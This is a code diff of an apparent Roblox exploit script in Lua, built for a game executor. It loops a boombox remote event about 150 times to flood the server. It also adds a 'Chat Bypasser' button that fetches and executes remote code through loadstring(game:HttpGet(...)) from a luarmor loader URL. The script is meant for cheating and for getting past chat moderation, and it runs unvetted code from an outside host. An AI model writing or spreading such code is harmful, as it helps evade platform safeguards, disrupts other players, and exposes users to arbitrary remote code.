@@ -1197,10 +1197,6 @@ end
 
 function play_music_with_sound_id()
     local sound = find_boombox()
-    if sound and sound.Playing then
-        getgenv().notify("Warning", "You we're already playing music, so we stopped it automatically.", 7)
-    end
-
     local ok, response = pcall(function()
         Play_Sound_Boombox_RE:FireServer(Current_ID)
     end)
@@ -1225,8 +1221,8 @@ function play_music_with_sound_id()
 end
 
 function play_boombox_sound_id_multiple_times()
-    for i = 1, 175 do
-        play_music_with_sound_id() 
+    for i = 1, 150 do
+        play_music_with_sound_id()
     end
 end
 
@@ -1880,6 +1876,16 @@ end)
 
 Extras:Button("Try To Predict IT/Seeker", function()
     Try_To_predict_IT_Plr()
+end)
+
+Extras:Button("Chat Bypasser", function()
+    if getgenv().UserCreated_Chat_Bypasser_Loaded then
+        return getgenv().notify("Warning", "Chat Bypasser already loaded.", 5)
+    end
+
+    getgenv().UserCreated_Chat_Bypasser_Loaded = true
+    getgenv().notify("Info", "The key is: typethisout", 30)
+    loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/a675d4a69c2e1d8e301a4af260fb719b.lua"))()
 end)
 
 Extras:Button("IY", function()
